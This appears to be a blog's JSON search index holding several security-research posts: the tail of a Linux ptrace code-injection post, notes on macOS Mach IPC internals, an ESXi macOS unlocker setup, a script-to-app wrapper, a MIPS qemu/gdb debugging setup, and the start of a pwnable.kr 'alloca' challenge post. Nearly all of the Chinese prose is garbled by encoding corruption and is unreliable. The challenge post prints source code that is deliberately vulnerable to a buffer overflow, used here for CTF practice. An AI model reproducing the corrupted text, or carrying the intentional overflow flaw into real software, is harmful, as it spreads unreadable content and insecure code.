ptrace(PTRACE_DETACH,traced_process,NULL,NULL); return 0;} 0x02 : æ•ˆæœ","link":"/2018/06/16/linux-code-inject/"},{"title":"macOS IPC Study Notes","text":"1. æ–¹å¼ MIG XPC DO â€¦. ç„¶è€Œä¸€åˆ‡éƒ½æ˜¯åœ¨Mach Msgçš„åŸºç¡€ä¹‹ä¸Šçš„ã€‚ 2. ä¸€äº›åŸºç¡€æ¦‚å¿µ2.1 ä»€ä¹ˆæ˜¯Portä¸ªäººç†è§£å°±æ˜¯ç±»ä¼¼Windowsä¸Šhandleçš„æ¦‚å¿µã€‚ç”¨æˆ·æ€ç»è¿‡å¤„ç†æ˜¯ä¸€ä¸ªç±»ä¼¼socketçš„æ•´æ•°ï¼Œå†…æ ¸æ€(namep)ç´¢å¼•åˆ°ä¸ä¹‹å¯¹åº”çš„æ¶ˆæ¯é˜Ÿåˆ—ï¼ŒIPCæ—¶é€šè¿‡Portä¼ é€’æ•°æ®åˆ°æ¶ˆæ¯é˜Ÿåˆ—ï¼Œæˆ–è€…ä»æ¶ˆæ¯é˜Ÿåˆ—å–å‡ºæ•°æ®ã€‚ 2.2.2 port name2.2.3 (port) rightä¸€ä¸ªportå’Œå¯¹è¿™ä¸ªportçš„è®¿é—®æƒé™ï¼Œæœ‰å¯¹åº”çš„æƒé™æ‰èƒ½åšå¯¹åº”çš„æ“ä½œï¼Œæ¯”å¦‚recvï¼Œæ¥æ”¶æ•°æ®ï¼›sendï¼Œå‘é€æ•°æ®ã€‚ 1234567#define MACH_PORT_RIGHT_SEND ((mach_port_right_t) 0)#define MACH_PORT_RIGHT_RECEIVE ((mach_port_right_t) 1)#define MACH_PORT_RIGHT_SEND_ONCE ((mach_port_right_t) 2)#define MACH_PORT_RIGHT_PORT_SET ((mach_port_right_t) 3)#define MACH_PORT_RIGHT_DEAD_NAME ((mach_port_right_t) 4)#define MACH_PORT_RIGHT_LABELH ((mach_port_right_t) 5)#define MACH_PORT_RIGHT_NUMBER ((mach_port_right_t) 6) 2.2 åˆ›å»ºæµç¨‹ç¤ºä¾‹ä»£ç ï¼š 12mach_port_t p;mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;p); mach_port_allocate å‡½æ•°å®šä¹‰å¦‚ä¸‹: 12345678910111213kern_return_tmach_port_allocate( ipc_space_t space, mach_port_right_t right, mach_port_name_t *namep){ kern_return_t kr; mach_port_qos_t qos = qos_template; kr = mach_port_allocate_full (space, right, MACH_PORT_NULL, &amp;qos, namep); return (kr);} mach_port_allocate_fullæ ¹æ®ä¸åŒçš„rightèµ°ä¸åŒçš„åˆ†é…é€»è¾‘ï¼š ipc_port_alloc /ipc_port_alloc_name ä¸¤ä¸ªå‡½æ•°åŒºåˆ«åªæ˜¯æ˜¯å¦æŒ‡å®šäº†nameã€‚ ipc_object_alloc 348è¡Œé€šè¿‡ä¸€ä¸ªå®ï¼ŒæŠŠportè½¬nameçš„æ–¹å¼è·å–namepï¼Œä¹‹åå¯¹ipc entryçš„å…³é”®ç»“æ„è¿›è¡Œåˆå§‹åŒ–ã€‚ ipc_port_init åˆå§‹åŒ–portç»“æ„ è‡³æ­¤ï¼Œportåˆå§‹åŒ–å®Œæˆï¼Œnamepåˆå§‹åŒ–å®Œæˆï¼Œå¯ä»¥æ ¹æ®namepç´¢å¼•åˆ°å¯¹åº”çš„å†…æ ¸ä¸­çš„æ¶ˆæ¯é˜Ÿåˆ—ã€‚ portä¸ipc entryçš„å…³ç³»ï¼Œæ¥è‡ªMac OS X Internals: å…¶ä¸­çš„ä¸€äº›æ¦‚å¿µï¼š ç”¨æˆ·æ€ mach_port_t portåœ¨ç”¨æˆ·æ€è¡¨ç¤ºï¼Œç±»ä¼¼socketçš„ä¸€ä¸ªæ•´æ•° å†…æ ¸æ€ mach_port_name_t 1typedef natural_t mach_port_name_t; portåœ¨å†…æ ¸æ€è¡¨ç¤º qos 1Structure used to pass information about port allocation requests.Must be padded to 64-bits total length. ipc space 12Each task has a private IPC spacea namespace for portsthat is represented by the ipc_space structure in the kernel. Mac OS X Internals æ¯ä¸ªtaskéƒ½æœ‰è‡ªå·±çš„å”¯ä¸€ä¸€ä¸ªipc sapce, å…¶ä¸­ ipc_entry_t is_table; /* an array of entries */ å­—æ®µæ˜¯æ”¾ç€æ‰€æœ‰çš„ipc entryã€‚ taskçš„ç»“æ„ä½“å®åœ¨æ˜¯å¤ªå¤§äº†ï¼Œä»taskçš„struct ipc_space *itk_space;å­—æ®µç´¢å¼•åˆ°å…¶å¯¹åº”çš„ipc spaceã€‚ ipc entry çœ‹æºç å‘ç°ï¼Œå›¾ä¸­çš„ipc_tree_entryç»“æ„æ²¡äº†: 123456789101112struct ipc_space { lck_spin_t is_lock_data; ipc_space_refs_t is_bits; /* holds refs, active, growing */ ipc_entry_num_t is_table_size; /* current size of table */ ipc_entry_num_t is_table_free; /* count of free elements */ ipc_entry_t is_table; /* an array of entries */ task_t is_task; /* associated task */ struct ipc_table_size *is_table_next; /* info for larger table */ ipc_entry_num_t is_low_mod; /* lowest modified entry during growth */ ipc_entry_num_t is_high_mod; /* highest modified entry during growth */ int is_node_id; /* HOST_LOCAL_NODE, or remote node if proxy space */}; portçš„user referenceè®¡æ•°æ˜¯å•¥ä¸€ä¸ªportçš„user referenceåªè¡¨ç¤ºäº†æŸä¸ªentryåœ¨taskçš„spaceä¸­è¢«å¤šå°‘ä¸ªåœ°æ–¹ä½¿ç”¨ï¼Œå’Œentryå®é™…æŒ‡å‘å“ªä¸ªportæ²¡æœ‰å…³ç³» 2.3 å‘é€MACH MSGmach msgçš„ç»“æ„ä¸å†èµ˜è¿°ï¼Œè¿™éƒ¨åˆ†ç›´æ¥çœ‹message.hå¤´æ–‡ä»¶é‡Œçš„å®šä¹‰å³å¯ï¼Œä¸‹é¢ç€é‡çœ‹å‘é€å’Œæ¥æ”¶è¿‡ç¨‹ã€‚ å…¶å®æ˜¯ä¸€ä¸ªæŠŠmach msgè½¬æ¢æˆkmsgç»“æ„ï¼Œç„¶åå…¥é˜Ÿ(ç›®æ ‡æ¶ˆæ¯é˜Ÿåˆ—)çš„æ“ä½œï¼Œç›®æ ‡è¿›ç¨‹è·å–å°±æ˜¯ä¸€ä¸ªå‡ºé˜Ÿçš„æ“ä½œã€‚ ç”¨æˆ·æ€(client) &lt;--&gt; å†…æ ¸æ€ &lt;--&gt; ç”¨æˆ·æ€(server) æ”¶/å‘éƒ½æ˜¯ç”¨mach_msgï¼Œä½¿ç”¨optionså‚æ•°åŒºåˆ«æ˜¯æ”¶è¿˜æ˜¯å‘ã€‚ 2.3.1 æµç¨‹123456789101112131415161718mach_msg(...) mach_msg_trap(...) mach_msg_overwrite_trap(...) option &amp; MACH_SEND_MSG --&gt; mach_msg_send // mach_msg --&gt; kmsg // alloc a kernel msg buffer(kmsg), and copy user mach_msg to kernel msg buffer ipc_kmsg_get(msg_addr, send_size, &amp;kmsg); ipc_kmsg_copyin ipc_kmsg_copyin_hearder(kmsg, space, override, optionp) ipc_kmsg_copyin_body(kmsg, space, map, optionp) ipc_kmsg_send ipc_voucher_send_preprocessing(kmsg); ipc_mqueue_send(&amp;port-&gt;ip_messages, kmsg,option,send_timeout); option &amp; MACH_RCV_MSG //TODO ipc_mqueue_copyin(space, rcv_name, &amp;mqueue, &amp;object); mach_msg_rcv_link_special_reply_port(...) ipc_mqueue_receive mach_msg_receive_results 2.3.2 å‘é€ mach_msg_send( mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_timeout_t send_timeout, mach_msg_priority_t override) æ ¹æ®æ¶ˆæ¯å¤§å°é‡æ–°åˆ†é…äº†å†…å­˜ï¼Œå¹¶ä¸”æŠŠæ¶ˆæ¯æ‹·è´è¿›æ¥ï¼Œå¹¶ä¸”æ¶ˆæ¯å°¾éƒ¨å¢åŠ äº†ä¸€äº›å­—æ®µ: 12345trailer = (mach_msg_max_trailer_t *) ((vm_offset_t)kmsg-&gt;ikm_header + send_size);trailer-&gt;msgh_sender = current_thread()-&gt;task-&gt;sec_token;trailer-&gt;msgh_audit = current_thread()-&gt;task-&gt;audit_token;trailer-&gt;msgh_trailer_type = MACH_MSG_TRAILER_FORMAT_0;trailer-&gt;msgh_trailer_size = MACH_MSG_TRAILER_MINIMUM_SIZE; ä¹‹å‰å®¡æœåŠ¡çš„æ—¶å€™é‡åˆ°è¿‡ï¼Œè¿˜ä»¥ä¸ºè¿™éƒ¨åˆ†æ˜¯å¯æ§çš„ï¼Œé€ æˆä¹Œé¾™ã€‚ å›§ ipc_kmsg_copyin(kmsg, space, map, override, &amp;option); æ­¤æ—¶kmsgæ˜¯æ–°åˆ†é…çš„å†…å­˜ï¼Œé‡Œé¢æ”¾çš„æ˜¯è¦å‘é€çš„mach msgï¼Œ spaceå’Œmapéƒ½æ˜¯å½“å‰taskçš„spaceå’Œmapï¼Œç›´æ¥è·å–ï¼Œè¿™éƒ¨åˆ†æœ‰ä¸ªå›¾ï¼Œå¯ä»¥çœ‹Macos Internalsã€‚ ipc_kmsg_copyin_header(kmsg, space, override, optionp); æ‹·è´ port rightsï¼ŒæˆåŠŸçš„è¯ï¼ŒåŸæœ¬æ¶ˆæ¯ä¸­(kmsg)çš„port nameéƒ½ä¼šè¢«æ›¿æ¢æˆå¯¹åº”çš„å¯¹è±¡çš„æŒ‡é’ˆã€‚ ipc_kmsg_copyin_body( kmsg, space, map); æ‹·è´msg bodyéƒ¨åˆ†ï¼Œä¸­é—´éªŒè¯äº†sizeã€descéƒ¨åˆ†çš„sizeï¼Œç±»å‹ç­‰å­—æ®µã€‚ desc_count &lt; 0x3fff ã€‚ descriptor_sizeéƒ¨åˆ†ï¼Œå¿…é¡»æ˜¯desc*16 == descriptor_sizeï¼Œä¸æ»¡è¶³ä¼šä¸ºäº†å¯¹é½è€Œè°ƒæ•´ã€‚ æœ€ç»ˆå®Œæˆæ‹·è´ï¼ŒæŠŠç”¨æˆ·æ€çš„mach msgæ‹·è´åˆ°äº†kmsgä¸­ã€‚ ipc_kmsg_send(kmsg, option, send_timeout); åˆ°è¿™é‡Œçš„æ—¶å€™port rightæ‹·è´äº†ï¼Œæ¶ˆæ¯å†…å®¹ä¹Ÿæ‹·è´äº†ï¼Œè¯¥ç›´æ¥å‘é€äº†ã€‚æŠŠæ¶ˆæ¯å‘é€åˆ°dstçš„æ¶ˆæ¯é˜Ÿåˆ—é‡Œã€‚ å¯¹äºå‘é€ç»™å†…æ ¸çš„æ¶ˆæ¯å’Œéå†…æ ¸çš„æ¶ˆæ¯åˆ†å¼€å¤„ç† å†…æ ¸ï¼škmsg = ipc_kobject_server(kmsg, option); å…¶ä»–ï¼šipc_mqueue_send(&amp;port-&gt;ip_messages, kmsg, option, send_timeout); 2.3.3 æ¥æ”¶ ipc_mqueue_copyin(space, rcv_name, &amp;mqueue, &amp;object); Convert a name in a space to a message queue. æ ¹æ®è¿™ä¸ªrecv_nameåœ¨spaceé‡Œæ‰¾åˆ°ipc_entryç»“æ„ï¼Œä»è€Œæ‰¾åˆ°å…¶ä¸­ipc_object-&gt;ipmessageç»“æ„ã€‚ mach_msg_rcv_link_special_reply_port(â€¦) ipc_mqueue_receive(mqueue, option, rcv_size, msg_timeout, THREAD_ABORTSAFE); Receive a message from a message queue ä¹‹å‰å¾—åˆ°äº†æ¶ˆæ¯é˜Ÿåˆ—mqueueï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯ä»è¿™ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸­å–å‡ºæ¶ˆæ¯ã€‚ ipc_mqueue_receive_on_threadä½¿ç”¨æŒ‡å®šthreadä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­æ¥æ”¶æ¶ˆæ¯ã€‚æ¥å—åˆ†port set(imq_is_set()) å’Œ å•ä¸ªport(imq_is_queue())ï¼Œè¿™éƒ¨åˆ†çœ‹message queueçš„ç»“æ„ä½“ä¹Ÿèƒ½çœ‹å‡ºæ¥å¿…é¡»è¦è¿™ä¹ˆå¤„ç†ã€‚ æ¶ˆæ¯é˜Ÿåˆ—æ˜¯ä¸€ä¸ªå¾ªç¯åŒå‘é“¾è¡¨ï¼Œå–æ¶ˆæ¯çš„è¿‡ç¨‹å°±æ˜¯ä¸€ä¸ª unlinkçš„è¿‡ç¨‹ï¼š mach_msg_receive_results Receive a messageï¼Œ copy outçš„æ“ä½œï¼ŒæŠŠä¹‹å‰â€œè§£é“¾â€çš„æ¶ˆæ¯æ‹·è´å‡ºæ¥ã€‚ 3. å¼•ç”¨å†è°ˆMach-IPCMac OS X InternalsMOXilAuditing and Exploiting Apple IPC â€“ Ianbeerbazad","link":"/2019/09/20/macOS-IPC-Study-basic-2/"},{"title":"macOS on ESXi","text":"VMWare ESXI é…ç½®macOSè™šæ‹Ÿæœº éœ€è¦çš„å·¥å…·/ISOunlocker3.0 æˆ–è€… unlocker macOSçš„ISOè‡ªè¡Œä¸‹è½½ è¿‡ç¨‹ç»™esxiæ‰“è¡¥ä¸1. unlocker3.0 ç™»é™†ç½‘é¡µç«¯esxiç®¡ç†ï¼Œæ‰“å¼€æœåŠ¡å™¨çš„sshæœåŠ¡ã€‚ åœ¨macOSçš„ç³»ç»Ÿä¸Šæ„å»ºå¥½unlocker 1python esxi-build.py sshç™»é™†è¿›å»ï¼ŒæŠŠä¸Šä¸ªæ­¥éª¤å¾—åˆ°çš„æ‰€æœ‰ä¸œè¥¿ä¸Šä¼ åˆ°æœåŠ¡å™¨ã€‚ æ‰“è¡¥ä¸ 12345tar -zxvf esxi-unlocker-300.tgzchmod a+x *.sh./esxi-install.sh# then reboot your serverreboot 2. å…¶ä»–ç‰ˆæœ¬unlockerç›´æ¥å¤åˆ¶åˆ°æœåŠ¡å™¨ï¼Œç„¶åæ‰§è¡Œesxi-install.shï¼Œéšåé‡å¯æœåŠ¡å™¨ã€‚ å®‰è£…vmè¿™é‡Œesxiçš„ç‰ˆæœ¬æ˜¯6.7ï¼ŒæŒ‰ç†è¯´å…¼å®¹6.5ã€‚ ç›´æ¥æŠŠé•œåƒä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸Šï¼Œç„¶åç›´æ¥æ–°å»ºvmã€‚ ä½†æ˜¯è¿™é‡Œå¾—åˆ°æŠ¥é”™ï¼š 1smc read error k0 esxi xxxxx æ— æ³•è§£å†³ã€‚ å¯¼å…¥ovfä½¿ç”¨ä½ç‰ˆæœ¬vm workstation(12)ï¼Œé€‰æ‹©å…¼å®¹æ€§esxi 6.5ï¼Œå»ºç«‹ä¸€ä¸ªmacosçš„è™šæ‹Ÿæœºï¼Œç„¶åå¯¼å‡ºovfï¼Œç„¶åéƒ¨ç½²åˆ°æœåŠ¡å™¨ä¸Šã€‚ è¿™é‡Œæ³¨æ„ï¼šå¯¼å‡ºå‰ç§»é™¤å…‰é©±åŠ è½½çš„é•œåƒï¼Œå¦åˆ™éƒ¨ç½²ä¼šå¤±è´¥ã€‚ è¿™ç§æ–¹å¼ï¼Œèƒ½éƒ¨ç½²ä¸Šå»ï¼Œä½†æ˜¯æ— é™é‡å¯ï¼Œå†…æ ¸æ— æ³•åŠ è½½èµ·æ¥ã€‚ å®‰è£…vm plan Bæ›´æ¢äº†unlockerçš„è¡¥ä¸ï¼Œå°±èƒ½æ­£å¸¸å®‰è£…äº†ã€‚ è¿™é‡Œçœ‹èµ·æ¥åº”è¯¥æ˜¯unlockerè¡¥ä¸çš„é—®é¢˜ - -ã€‚ ç„å­¦","link":"/2019/05/10/macOS-on-ESXi/"},{"title":"make-script-to-macOS App","text":"0x00 : éœ€æ±‚ä¸»è¦æ˜¯Ghidraè¿™ä¸ªä¸œè¥¿ï¼Œæ¯æ¬¡å¯åŠ¨éƒ½è¦å‘½ä»¤è¡Œ GhidraRunï¼Œå¤ªéº»çƒ¦äº†ï¼Œæ‰€ä»¥å°±æƒ³æŠŠè¿™ä¸ªå¯åŠ¨è„šæœ¬å°è£…æˆä¸€ä¸ªmacOSçš„APPï¼Œæ–¹ä¾¿ä½¿ç”¨ã€‚ 0x01 : è¿‡ç¨‹ç›´æ¥ä½¿ç”¨äº† åˆ«äººå†™å¥½çš„appfiy.sh ï¼Œæˆ‘ç”¨çš„æ˜¯åŸä½œè€…çš„ï¼Œé“¾æ¥é‡Œçš„æ˜¯äºŒæ¬¡å¼€å‘çš„ï¼Œå…¶å®æœ¬è´¨æ˜¯ä¸€æ ·çš„ã€‚ 123456789101112131415#!/usr/bin/env bashAPPNAME=${2:-$(basename &quot;${1}&quot; '.sh')};DIR=&quot;${APPNAME}.app/Contents/MacOS&quot;;if [ -a &quot;${APPNAME}.app&quot; ]; then echo &quot;${PWD}/${APPNAME}.app already exists :(&quot;; exit 1;fi;mkdir -p &quot;${DIR}&quot;;cp &quot;${1}&quot; &quot;${DIR}/${APPNAME}&quot;;chmod +x &quot;${DIR}/${APPNAME}&quot;;echo &quot;${PWD}/$APPNAME.app&quot;; å› ä¸ºmacOSä¸‹appæœ¬è´¨æ˜¯ä¸€ä¸ªç›®å½•ï¼Œæ‰€ä»¥åªéœ€è¦æŒ‰ç…§ç‰¹å®šçš„æ ¼å¼æ„å»ºè¿™ä¸ªç›®å½•å³å¯ã€‚ 1234567891011â¯ cd /Applications/Ghidra.appâ•­â”€ ï…¹ î‚° ï„• /Applications/Ghidra.app î‚°Â·Â·î‚² âœ” î‚² at 12:51:35 ï€—â•°â”€â¯ lsContents Icon?â¯ tree ..â”œâ”€â”€ Contentsâ”‚ â””â”€â”€ MacOSâ”‚ â””â”€â”€ Ghidraâ””â”€â”€ Icon\\r æœ¬æ¥æˆ‘æ˜¯æŠŠghridaçš„å¯åŠ¨è„šæœ¬ç›´æ¥æ”¾è¿›æ¥çš„ï¼Œä½†æ˜¯å‘ç°æœ‰ä¸€äº›ç›®å½•çš„é—®é¢˜ï¼Œç´¢æ€§ç›´æ¥ç»å¯¹è·¯å¾„å¯åŠ¨è¿™ä¸ªè„šæœ¬å¥½äº†(æ‡’çœäº‹å„¿å•Š hhh) 12345678#!/usr/bin/env bash#----------------------------------------# Ghidra launch#----------------------------------------/Users/muhe/Tools/ghidra/ghidraRun æœ€åï¼Œå›¾æ ‡å¯ä»¥å…ˆå¤åˆ¶ä½ æƒ³ç”¨çš„å›¾ç‰‡ï¼Œç„¶åå¯¹appå³é”®ï¼Œget infoï¼Œç‚¹å‡»ä¿¡æ¯æ ä¸Šé¢çš„å°å›¾æ ‡ï¼Œä¹‹åcmd+vå°±è¡Œäº†ï¼Œä¹ŸæŒºæ–¹ä¾¿ã€‚ æœ€åï¼Œå°±å¯ä»¥å¾ˆèˆ’æœçš„å¯åŠ¨äº†ã€‚ 0x02 : å‚è€ƒshell-script-mac-apps","link":"/2020/08/07/make-script-to-macOS-App/"},{"title":"macOS IPC Study basic","text":"ç®—æ˜¯ä¸ªè¯»ä¹¦ç¬”è®°å§ï¼ŒæŠŠåˆ©ç”¨Portè¿›è¡ŒIPCçš„è¿™ä¸ªè¿‡ç¨‹è½¬æˆè‡ªå·±çš„ç†è§£ã€‚ Scenario 1 : Alice &amp;&amp; BobAlice æå‰çŸ¥é“Bobï¼Œå³ï¼š 1Alice processes a `SEND` right to a port whose `RECEIVE` right is held by Bob. Alice åˆ›å»ºä¸€ä¸ªä¸´æ—¶portï¼Œå¥¹å¯¹è¿™ä¸ªportæœ‰ RECEIVEright Alice å¯¹åˆ›å»ºçš„portæ·»åŠ  SENDright Alice ä½¿ç”¨æå‰çŸ¥æ™“çš„å¯¹å…¶æœ‰ SENDrightçš„portï¼ŒæŠŠå¥¹åˆšåˆ›å»ºçš„ä¸´æ—¶portå‘Bobå‘è¿‡å» Bobæ¥æ”¶åˆ°è¿™ä¸ªAliceåˆ›å»ºçš„portä¹‹åï¼ŒBobå¯ä»¥åˆ©ç”¨è¿™ä¸ªportå’ŒAliceé€šä¿¡ï¼Œå› ä¸ºè¿™ä¸ªä¸´æ—¶portæœ‰ SENDright å’Œ RECEIVEright Scenario 2 : Bootstrap server (regstrain)åœºæ™¯1æœ‰ç‚¹ç±»ä¼¼å…ˆæœ‰é¸¡å’Œå…ˆæœ‰è›‹çš„é—®é¢˜ï¼Œå³æœ€å¼€å§‹Aliceå’‹çŸ¥é“Bobçš„(æœ€å¼€å§‹ SENDright çš„portå“ªé‡Œæ¥çš„ï¼Ÿ)ï¼Œæ‰€ä»¥è¿™é‡Œå¼•å…¥äº†ä¸€ä¸ªä¸­é—´äººâ€” bootstrap Bob: Bob å¯¹ bootstrapserver æŒæœ‰ SEND rightport Bob åˆ›å»ºå¦å¤–çš„portï¼Œå¯¹å…¶æœ‰ RECEIV right, å¹¶ä¸”å¯¹å…¶åˆ›å»º SEND rightï¼Œç„¶ååˆ©ç”¨æœ€å¼€å§‹å¯¹ bootstrapæŒæœ‰çš„ SEND RIGHTportï¼ŒæŠŠæ–°åˆ›å»ºçš„è¿™ä¸ª SEND rightå‘è¿‡å»ã€‚ åŒæ—¶ï¼Œå‘é€è¿‡å»çš„ SEND rightæœ‰ä¸€ä¸ªåˆ«åï¼Œå¯ä»¥æ–¹ä¾¿ç´¢å¼•åˆ°è¿™ä¸ª SEND rightï¼Œè¿™é‡Œå« com.apple.Bob Alice: åŒæ ·çš„ï¼ŒAliceå¯¹ bootstrap serverï¼ŒæŒæœ‰ SEND rightport Aliceå‘é€æ¶ˆæ¯ç»™ bootstrap serverï¼ŒæŸ¥è¯¢ com.apple.Bobï¼Œæƒ³è¦è·å–å¯¹Bobçš„ SEND right bootstrap serveræ¥æ”¶åˆ°ä¹‹åï¼Œæ ¹æ®Aliceæä¾›çš„åˆ«åæŸ¥è¯¢ï¼Œæ‰¾åˆ°ä¹‹åï¼Œè¿”å›å¯¹åº”çš„ SEND rightç»™Alice è‡³æ­¤ï¼ŒAliceå¯ä»¥ä½¿ç”¨è·å¾—çš„è¿™ä¸ª SEND rightå’ŒBobé€šä¿¡äº†(åˆ«å¿˜äº†ä¸Šé¢è¯´çš„ï¼ŒBobå¯¹è¿™ä¸ªportæœ‰ RECEIVE right) Scenario 3: Bootstrap server (check-in)è¿™ç§æ¯”è¾ƒéº»çƒ¦ï¼Œå‡ºäºå®‰å…¨è€ƒè™‘çš„è®¾è®¡ ï¼š bootstrap server æ€ä¹ˆç¡®å®šè¿™ä¸ªæœåŠ¡çš„ç¡®å°±æ˜¯çœŸçš„æœåŠ¡å‘¢ï¼Ÿè€Œä¸æ˜¯æŸä¸ªåˆ«æœ‰ç”¨å¿ƒçš„ç¨‹åºå†’å……çš„å‘¢ï¼Ÿ ç³»ç»Ÿåˆå§‹åŒ–çš„æ—¶å€™ï¼Œbootstrap server åˆå§‹åŒ–æ‰€æœ‰çš„æœåŠ¡ï¼Œå¯¹è¿™äº›æœåŠ¡æœ‰ RECEIVE right Aliceé€šè¿‡ bootstrap_lookup()æƒ³è¦è·å–æƒ³è¦çš„æœåŠ¡(com.apple.Bob)çš„ SEND right æ­¤æ—¶ï¼Œbootstrap serveræ‹¿åˆ°äº†è¿™ä¸ªè¯·æ±‚ï¼Œæ­¤æ—¶Bobè¿™ä¸ªæœåŠ¡è¿˜ä¸å­˜åœ¨ï¼Œè¿™ä¸ªæ—¶å€™éœ€è¦bootstrap server ä½¿ç”¨ fork()``exec()ç­‰apiäº§ç”Ÿè¿™ä¸ªæœåŠ¡ï¼ˆå½“ç„¶æƒé™ä¹Ÿè¦è®¾è®¡å¥½ï¼‰ æ­¤æ—¶Bobå­˜åœ¨äº†ï¼Œé†’æ¥äº†ï¼Œä»–ä½¿ç”¨ bootstrap_check_in()å‘ bootstrap serverç”³è¯·å¯¹è‡ªå·±æœåŠ¡çš„portçš„ RECEIVE right bootstrap serverä¼šå¯¹è¿™ä¸ªç”³è¯·çš„port(æ­¤æ—¶Bobæ˜¯å®ƒå”¯ä¸€çš„æ‹¥æœ‰è€…)åˆ›å»º SEND rightï¼Œç„¶åå‘é€ç»™Alice è‡³æ­¤ï¼Œä¸¤äººå¯ä»¥é€šä¿¡äº† Reference*OS Internals Volume I User Mode â€“ Jonathan Levin","link":"/2019/08/20/macOS-IPC-Study-basic/"},{"title":"mipsç¨‹åºè°ƒè¯•ç¯å¢ƒæŠ˜è…¾","text":"0x00 : èµ·å› æ¯”èµ›é‡åˆ°äº†ï¼Œå¸®å­¦å¼ŸæŠ˜è…¾è°ƒè¯•ç¯å¢ƒï¼Œä¸­é—´è¸©å‘æ— æ•°ï¼Œä½†æ˜¯æœ€åè¿˜æ˜¯è§£å†³äº†ï¼Œå°±è®°å½•ä¸‹ã€‚ 0x01 : æœ€åˆå°è¯•æœ€åˆå°è¯•åœ¨Linuxè™šæ‹Ÿæœºé‡Œï¼Œqemu + gdbserverçš„æäº‹æƒ…ï¼Œä½†æ˜¯ï¼Œä¾èµ–é—®é¢˜å¤ªé—¹å¿ƒäº†ï¼Œå„ç§äº¤å‰ç¼–è¯‘çš„è›‹ç–¼äº‹æƒ…ã€‚ æ‰€ä»¥å°±æ”¾å¼ƒäº†ã€‚ 0x02 : dockerä¸“æ²»ç¯å¢ƒæ­å»ºåæ¥æƒ³äº†æƒ³ï¼Œæˆ‘ä¸ºå•¥ä¸ç”¨dockerç¥å™¨ï¼Œè‚¯å®šæœ‰äººå’Œæˆ‘ä¸€æ ·ä¸æƒ³å¼„äº¤å‰ç¼–è¯‘ç¯å¢ƒï¼Œæ‰€ä»¥è‚¯å®šæäº†è¿™æ ·çš„é•œåƒï½ Googleæœç´¢ä¸€å¤§å †ä¹‹åï¼š multiarch-docker cross è¿™ä¸¤ä¸ªè¿˜ä¸é”™ï¼Œæˆ‘é€‰æ‹©äº†ç¬¬ä¸€ä¸ªæ¥ä½¿ç”¨ã€‚ 0x03 : ä½¿ç”¨è¿‡ç¨‹1. è·å–æ‰€éœ€é•œåƒ1docker pull skysider/multiarch-docker 2. å¯åŠ¨12345678$ docker run -it \\ --rm \\ -h baby_mips \\ --name baby_mips \\ -v $(pwd):/ctf/work \\ -P \\ --cap-add=SYS_PTRACE \\ skysider/multiarch-docker 3. å¤åˆ¶æ–‡ä»¶1$ docker cp ~/Downloads/baby_mips.dms 207187a8a24d:/tmp/ 4. è°ƒè¯•è¿™é‡Œéœ€è¦å¼€ä¸¤ä¸ªbashï¼Œåœ¨å¯åŠ¨å®¹å™¨çš„æ—¶å€™å·²ç»æœ‰ä¸€ä¸ªbahsäº†ï¼Œ 1docker ps -a çœ‹çœ‹å½“å‰è¿™ä¸ªå®¹å™¨çš„idï¼Œç„¶åï¼š 1docker exec -it id /bin/bash å¾—åˆ°ä¸¤ä¸ªbashï¼Œä¸€ä¸ªè¿è¡Œç¨‹åºï¼Œä¸€ä¸ªgdbçª—å£ã€‚ è¿è¡Œç¨‹åºï¼š 1qemu-mipsel -g 2333 ./demo gdbè°ƒè¯•ç«¯å£æ˜¯2333 gdbçª—å£ï¼š 1gdb-multiarch ./demo ç„¶ågdbé‡Œ 1target remote localhost:2333 gdbé‡Œå¥½åƒä¸ç”¨set archäº†ï¼Œpwngdbæ’ä»¶è‡ªåŠ¨è¯†åˆ«äº†å¥½åƒ å›§ 5. have funEnjoy your debug journey~","link":"/2018/04/19/mips%E7%A8%8B%E5%BA%8F%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%8A%98%E8%85%BE/"},{"title":"pwnable.kr -- alloca","text":"0x00:å¥½ä¹…æ²¡ç©äº†â€¦å»å¹´åæœˆä»¥åå°±æ²¡ç©è¿‡äº†TAT è¿™å‡ å¤©æŠŠpeachçš„å‘ï¼Œwinaflçš„å‘å¡«äº†ä¸‹ï¼Œå°±æ¥æä¸‹pwnã€‚ 0x01:è¿™ä¸ªç¨‹åºæ˜¯ç»™äº†æºç çš„ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void clear_newlines(){ int c; do{ c = getchar(); }while (c != '\\n' &amp;&amp; c != EOF);}int g_canary;int check_canary(int canary){ int result = canary ^ g_canary; int canary_after = canary; int canary_before = g_canary; printf(\"canary before using buffer : %d\\n\", canary_before); printf(\"canary after using buffer : %d\\n\\n\", canary_after); if(result != 0){ printf(\"what the f...??? how did you fucked this buffer????\\n\"); } else{ printf(\"I told you so. its trivially easy to prevent BOF :)\\n\"); printf(\"therefore as you can see, it is easy to make secure software\\n\"); } return result;}int size;char* buffer;int main(){ printf(\"- BOF(buffer overflow) is very easy to prevent. here is how to.\\n\\n\"); sleep(2); printf(\" 1. allocate the buffer size only as you need it\\n\"); printf(\" 2. know your buffer size and limit the input length\\n\\n\"); printf(\"- simple right?. let me show you.\\n\\n\"); sleep(2); printf(\"- whats the maximum length of your buffer?(byte) : \"); scanf(\"%d\", &amp;size); clear_newlines(); printf(\"- give me your random canary number to prove there is no BOF : \"); scanf(\"%d\", &amp;g_canary); clear_newlines(); printf(\"- ok lets allocate a buffer of length %d\\n\\n\", size); sleep(1); buffer = alloca( size + 4 ); // 4 is for canary printf(\"- now, lets put canary at the end of the buffer and get your data\\n\"); printf(\"- don't worry! fgets() securely limits your input after %d bytes :)\\n\", size); printf(\"- if canary is not changed, we can prove there is no BOF :)\\n\"); printf(\"$ \"); memcpy(buffer+size, &amp;g_canary, 4); // canary will detect overflow. fgets(buffer, size, stdin); // there is no way you can exploit this. printf(\"\\n\"); printf(\"- now lets check canary to see if there was overflow\\n\\n\"); check_canary( *((int*)(buffer+size)) ); return 0;} ä¸»è¦è¿˜æ˜¯éœ€è¦çªç 